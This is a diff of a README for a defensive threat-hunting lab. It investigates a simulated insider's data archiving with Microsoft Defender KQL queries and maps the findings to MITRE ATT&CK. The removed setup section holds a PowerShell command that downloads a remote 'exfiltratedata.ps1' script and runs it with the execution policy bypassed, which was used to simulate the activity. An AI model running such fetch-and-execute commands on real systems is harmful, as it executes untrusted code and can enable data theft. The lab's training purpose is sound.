@@ -4,7 +4,7 @@
   </a>
 </p>
 
-<h1 align="center">Scenario 3: Suspected Data Exfiltration Employee</h1>
+<h1 align="center">Scenario 3: Suspected Data Exfiltration by Employee on PIP</h1>
 
 <p align="center">
   <img src="https://img.shields.io/badge/Platform-Azure-0078D4?style=for-the-badge&logo=microsoftazure&logoColor=white" alt="Cloud Platform" />
@@ -16,12 +16,12 @@
 
 ---
 
-## 📌 Project Objective
-> Investigate suspected data exfiltration activities on a corporate device belonging to a disgruntled employee. Use Microsoft Defender for Endpoint logs to identify abnormal file, process, and network behavior related to archiving and transferring proprietary data.
+##  Project Objective
+> Investigate signs of data exfiltration from a potentially disgruntled employee (John Doe) placed on a performance improvement plan (PIP). Use MDE telemetry to examine compression, archiving, and suspicious PowerShell activities, with TTP mapping to MITRE ATT&CK.
 
 ---
 
-## 🧰 Tools & Technologies
+##  Tools & Technologies
 - **Platform:** Azure VM
 - **OS:** Windows 10
 - **Tools:** Microsoft Defender for Endpoint, PowerShell, Log Analytics
@@ -29,129 +29,113 @@
 
 ---
 
-## 🧠 Skills Gained / Focus Areas
-- Investigated suspicious user activity using endpoint logs
-- Detected archiving software and file compression behavior
-- Correlated timestamped events across process, file, and network layers
-- Applied MITRE TTP mapping for insider threat scenarios
+##  Skills Gained / Focus Areas
+- Threat hunting using Microsoft Defender tables (`DeviceFileEvents`, `DeviceProcessEvents`)
+- Anomaly detection in process behavior
+- TTP mapping using MITRE ATT&CK
+- Insider threat investigation methodology
 
 ---
 
-## 🧪 Environment Setup
-> Created a Windows 10 VM onboarded to MDE. Simulated exfiltration by running:
-```powershell
-Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1' -OutFile 'C:\programdata\exfiltratedata.ps1'
-cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1
-```
+##  Environment Setup
+> Created a Windows 10 VM (`cavada-cyber-pc`) and simulated suspicious archiving behavior using PowerShell and 7-Zip.
 
 > Employee under investigation: `John Doe`  
-> Device: `windows-target-1`
-
-![Environment Setup](assets/images/setup.jpg)
+> Device: `cavada-cyber-pc`
 
 ---
 
-## 🛠️ Walkthrough
-1. [Step 1: Preparation](#step-1-preparation)
-2. [Step 2: Data Collection](#step-2-data-collection)
-3. [Step 3: Data Analysis](#step-3-data-analysis)
-4. [Step 4: Investigation](#step-4-investigation)
-5. [Step 5: Response](#step-5-response)
-6. [Step 6: Documentation](#step-6-documentation)
-7. [Step 7: Improvement](#step-7-improvement)
-
----
+##  Walkthrough
 
 ### ✅ Step 1: Preparation
-> Hypothesis: John may be attempting to compress and exfiltrate sensitive data using scripts or archiving tools.
+> **Hypothesis:** John Doe may attempt to archive sensitive company files and exfiltrate them using cloud sync or removable drives.
 
 ---
 
 ### ✅ Step 2: Data Collection
-> Inspected the following telemetry tables:
-- `DeviceFileEvents`
-- `DeviceProcessEvents`
-- `DeviceNetworkEvents`
-
-> Focused on `windows-target-1` within the activity window after script execution.
+> Searched for `.zip` file activity:
+```kql
+DeviceFileEvents
+| where DeviceName == "cavada-cyber-pc"
+| where FileName endswith ".zip"
+| order by Timestamp desc
+```
 
 ---
 
 ### ✅ Step 3: Data Analysis
-> Detected archiving activity using:
+> Focused on zip file timestamp: `2025-07-11T19:57:40.9253485Z`  
+> Correlated with surrounding process activity:
 ```kql
-let archive_applications = dynamic(["winrar.exe", "7z.exe", "winzip32.exe", "peazip.exe", "Bandizip.exe", "UniExtract.exe", "POWERARC.EXE", "IZArc.exe", "AshampooZIP.exe", "FreeArc.exe"]);
-let VMName = "windows-target-1";
+let VMName = "cavada-cyber-pc";
+let specificTime = datetime(2025-07-11T19:57:40.9253485Z);
 DeviceProcessEvents
-| where FileName has_any(archive_applications)
+| where Timestamp between ((specificTime - 2m) .. (specificTime + 2m))
 | where DeviceName == VMName
 | order by Timestamp desc
+| project Timestamp, DeviceName, ActionType, FileName, ProcessCommandLine
 ```
 
-> Timestamp from findings: `2024-10-15T19:00:48.5615171Z`
-
-> Pivoted to file activity:
-```kql
-let specificTime = datetime(2024-10-15T19:00:48.5615171Z);
-DeviceFileEvents
-| where Timestamp between ((specificTime - 1m) .. (specificTime + 1m))
-| where DeviceName == "windows-target-1"
-| order by Timestamp desc
-```
-
-> Investigated outbound connection attempts:
-```kql
-let specificTime = datetime(2024-10-15T19:00:48.5615171Z);
-DeviceNetworkEvents
-| where Timestamp between ((specificTime - 2m) .. (specificTime + 2m))
-| where DeviceName == "windows-target-1"
-| order by Timestamp desc
-```
+> ✅ Discovery: A PowerShell script silently installed 7-Zip (`msiexec.exe /quiet`) and used it to create archive files at regular intervals.
 
 ---
 
 ### ✅ Step 4: Investigation
-> Found evidence of:
-- A PowerShell script initiating file compression
-- Outbound connections to unknown external IPs shortly after archiving
-- Actions mapping to MITRE techniques:
-  - **T1560.001** – Archive via Utility
-  - **T1041** – Exfiltration over C2 channel
+- Detected periodic `.zip` file creation in backup folder.
+- Identified PowerShell execution chaining with MSI installation and 7-Zip usage.
+- Behavior aligns with several MITRE TTPs (see below).
+- No immediate signs of external exfiltration (e.g., cloud storage, FTP, C2 traffic).
 
 ---
 
 ### ✅ Step 5: Response
-> - Escalated to security operations  
-> - Recommended disabling John Doe’s account  
-> - Suggested isolating `windows-target-1` and collecting an investigation package
+- Reported findings to management.
+- No current action recommended until further instructions are provided.
+- Endpoint has not shown active exfiltration but should remain monitored.
 
 ---
 
 ### ✅ Step 6: Documentation
-> - Archived tool executed by John Doe on `windows-target-1`  
-> - Compressed data and outbound connection observed  
-> - Timeline, tool usage, and artifacts were logged and archived  
-> - Queries and indicators saved for replay and rule development
+- Archived relevant logs and queries.
+- Saved evidence of 7-Zip installation via PowerShell.
+- Noted timing correlation between `.zip` creation and PowerShell activity.
+- No exfiltration traffic confirmed; further review recommended.
 
 ---
 
 ### ✅ Step 7: Improvement
-> - Restrict archiving software and PowerShell script execution  
-> - Apply DLP policies to monitor sensitive file access  
-> - Enable alerts for compression + outbound transfer behavior  
-> - Implement better user behavior analytics for flagged users
+- Restrict PowerShell script execution for high-risk users.
+- Block installation of unauthorized compression tools like 7-Zip.
+- Monitor `.zip` creation combined with cloud upload or USB activity.
+- Implement DLP policies for sensitive file movement.
 
 ---
 
-## 📝 Timeline Summary and Findings
-- John Doe ran a script that created compressed files  
-- Log evidence showed PowerShell and outbound IP communication  
-- Activity aligned with insider threat and exfiltration patterns  
-- Threat contained before actual damage confirmed
+##  Timeline Summary and Findings
+- `.zip` files detected on `cavada-cyber-pc`, moved to backup folder.
+- Installed 7-Zip silently via PowerShell script using `msiexec.exe`.
+- Created zip archives at regular intervals.
+- No exfiltration traffic observed, but activity matches staging behaviors.
+
+---
+
+##  MITRE ATT&CK TTP Mapping
+
+| Tactic               | Technique ID & Name                                                                 | Description |
+|----------------------|--------------------------------------------------------------------------------------|-------------|
+| **Defense Evasion**  | [T1059.001 – PowerShell](https://attack.mitre.org/techniques/T1059/001/)            | PowerShell script was used to automate actions, including installing and executing 7-Zip. |
+| **Defense Evasion**  | [T1218.005 – MSIExec](https://attack.mitre.org/techniques/T1218/005/)               | 7-Zip was silently installed using `msiexec.exe`, a trusted Windows utility. |
+| **Collection**       | [T1560.001 – Archive via Utility](https://attack.mitre.org/techniques/T1560/001/)   | Files were regularly compressed into `.zip` archives using 7-Zip. |
+| **Command & Control** (potential) | [T1105 – Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/)              | If 7-Zip or the script was downloaded remotely, this technique may apply. |
+| **Exfiltration** (potential)     | [T1567.001 – Exfiltration to Cloud Storage](https://attack.mitre.org/techniques/T1567/001/) <br> [T1048 – Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048/) | Although no exfil was confirmed, regular archiving behavior may indicate staging for future data transfer. |
+
+>  **Note:** No direct evidence of exfiltration was found, but further review of outbound traffic, cloud sync usage, and PowerShell script origins is recommended.
 
 ---
 
 ## 📎 References
 - [T1560.001 – Archive via Utility (MITRE)](https://attack.mitre.org/techniques/T1560/001/)
-- [T1041 – Exfiltration Over C2 Channel (MITRE)](https://attack.mitre.org/techniques/T1041/)
-- [Microsoft Defender Investigation Hunting](https://learn.microsoft.com/en-us/microsoft-365/security/defender/advanced-hunting-overview)
+- [T1059.001 – PowerShell (MITRE)](https://attack.mitre.org/techniques/T1059/001/)
+- [T1218.005 – MSIExec (MITRE)](https://attack.mitre.org/techniques/T1218/005/)
+- [Microsoft Defender Advanced Hunting Docs](https://learn.microsoft.com/en-us/microsoft-365/security/defender/advanced-hunting-overview)
+
